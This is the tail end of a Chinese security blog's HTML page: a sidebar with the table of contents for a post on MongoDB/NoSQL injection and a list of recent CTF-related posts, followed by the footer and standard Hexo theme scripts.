class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/ari.webp" onerror="this.onerror=null;this.src='/img/dacapo.gif'" alt="avatar"/></div><div class="author-info-name">AyaN0</div><div class="author-info-description">”如果是你的话，是否会选择继续前进呢"</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/kisakiayano" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:1594453512@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客喵</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#N0sql"><span class="toc-text">N0sql</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MongoDB-%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E8%A7%A3%E6%9E%90"><span class="toc-text">MongoDB 基础概念解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%88Database%EF%BC%89"><span class="toc-text">数据库（Database）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E6%A1%A3%EF%BC%88Document%EF%BC%89"><span class="toc-text">文档（Document）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9B%86%E5%90%88%EF%BC%88Collection%EF%BC%89"><span class="toc-text">集合（Collection）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MongoDB%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C"><span class="toc-text">MongoDB基础操作</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">创建数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E9%9B%86%E5%90%88"><span class="toc-text">创建集合</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%92%E5%85%A5%E6%96%87%E6%A1%A3"><span class="toc-text">插入文档</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9B%B4%E6%96%B0%E6%96%87%E6%A1%A3"><span class="toc-text">更新文档</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%96%87%E6%A1%A3"><span class="toc-text">查询文档</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MongoDB-%E4%B8%8E-RDBMS-%E4%B9%8B%E9%97%B4%E7%9A%84%E7%B1%BB%E6%AF%94%E6%AF%94%E8%BE%83"><span class="toc-text">MongoDB 与 RDBMS 之间的类比比较</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%97%B6%E9%97%B4%E5%88%B0"><span class="toc-text">注入时间到</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E4%B8%AD%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="toc-text">PHP中的注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%87%8D%E8%A8%80%E5%BC%8F%E6%B3%A8%E5%85%A5"><span class="toc-text">重言式注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-text">联合查询注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#js%E6%B3%A8%E5%85%A5"><span class="toc-text">js注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#where-%E6%93%8D%E4%BD%9C%E7%AC%A6"><span class="toc-text">$where 操作符</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#commmand%E6%96%B9%E6%B3%95%E6%B3%A8%E5%85%A5"><span class="toc-text">commmand方法注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#execute%E6%96%B9%E6%B3%95%E6%B3%A8%E5%85%A5"><span class="toc-text">execute方法注入</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">布尔盲注</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nodejs%E4%B8%AD%E7%9A%84MongoDB%E6%B3%A8%E5%85%A5"><span class="toc-text">Nodejs中的MongoDB注入</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/" title="刷题蛆来咯-CTFshow">刷题蛆来咯-CTFshow</a><time datetime="2025-07-07T06:19:38.000Z" title="发表于 2025-07-07 14:19:38">2025-07-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/07/114514%E5%88%86%E9%92%9F%E8%83%BD%E4%BA%86%E8%A7%A3SSRF%E5%90%97/" title="114514分钟能了解SSRF吗">114514分钟能了解SSRF吗</a><time datetime="2025-07-07T05:05:59.000Z" title="发表于 2025-07-07 13:05:59">2025-07-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/01/%E7%A3%A8%E5%A5%BD%E7%9A%84%E5%88%A9%E5%89%91-PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/" title="磨好的利剑:PHP原生类">磨好的利剑:PHP原生类</a><time datetime="2025-07-01T05:58:51.000Z" title="发表于 2025-07-01 13:58:51">2025-07-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/01/Nosql%E6%B3%A8%E5%85%A5/" title="Nosql注入">Nosql注入</a><time datetime="2025-07-01T02:35:37.000Z" title="发表于 2025-07-01 10:35:37">2025-07-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/22/2025%E5%B9%B4%E4%B8%AD%E6%80%BB%E7%BB%93/" title="2025年中总结">2025年中总结</a><time datetime="2025-06-22T08:06:33.000Z" title="发表于 2025-06-22 16:06:33">2025-06-22</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By AyaN0</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><div class="aplayer no-destroy" data-id="2688080408" data-server="netease" data-type="song" data-fixed="true" data-autoplay="true"> </div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="Venus,Mars,Diana,Minerva,Ceres,Vulcan,Pluto,Vulcan,Juno,Mercury,Vesta,Saturn,Proserpina,Neptune,Jupiter" data-fontsize="15px" data-random="false" async="async"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script>(() => {
  const destroyAplayer = () => {
    if (window.aplayers) {
      for (let i = 0; i < window.aplayers.length; i++) {
        if (!window.aplayers[i].options.fixed) {
          window.aplayers[i].destroy()
        }
      }
    }
  }

  const runMetingJS = () => {
    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
  }

  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
})()</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

  window.pjax = new Pjax({
    elements: 'a:not([target="_blank"])',
    selectors: pjaxSelectors,
    cacheBust: false,
    analytics: false,
    scrollRestoration: false
  })

  const triggerPjaxFn = (val) => {
    if (!val) return
    Object.values(val).forEach(fn => fn())
  }

  document.addEventListener('pjax:send', () => {
    // removeEventListener
    btf.removeGlobalFnEvent('pjaxSendOnce')
    btf.removeGlobalFnEvent('themeChange')

    // reset readmode
    const $bodyClassList = document.body.classList
    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')

    triggerPjaxFn(window.globalFn.pjaxSend)
  })

  document.addEventListener('pjax:complete', () => {
    btf.removeGlobalFnEvent('pjaxCompleteOnce')
    document.querySelectorAll('script[data-pjax]').forEach(item => {
      const newScript = document.createElement('script')
      const content = item.text || item.textContent || item.innerHTML || ""
      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
      newScript.appendChild(document.createTextNode(content))
      item.parentNode.replaceChild(newScript, item)
    })

    triggerPjaxFn(window.globalFn.pjaxComplete)
  })

  document.addEventListener('pjax:error', e => {
    if (e.request.status === 404) {
      pjax.loadUrl('/404')
    }
  })
})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>